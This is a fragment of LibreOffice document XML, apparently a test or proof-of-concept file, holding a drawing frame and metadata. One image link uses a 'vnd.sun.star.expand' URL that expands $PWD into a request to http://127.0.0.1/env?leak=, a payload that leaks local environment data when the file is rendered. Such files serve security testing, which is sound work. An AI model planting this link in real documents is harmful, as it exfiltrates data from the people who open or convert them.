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600000660C48134E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1874in" svg:height="11in" draw:z-index="0"><draw:image xlink:href="vnd.sun.star.expand:http://127.0.0.1/env?leak=$PWD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09:10:57.406663571</meta:creation-date>
    <dc:date>2025-02-25T09:11:23.413603695</dc:date>
    <meta:editing-duration>PT2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3.2$Linux_X86_64 LibreOffice_project/433d9c2ded56988e8a90e6b2e771ee4e6a5ab2ba</meta:generator>
  </office:meta>
</office:document-meta>
</file>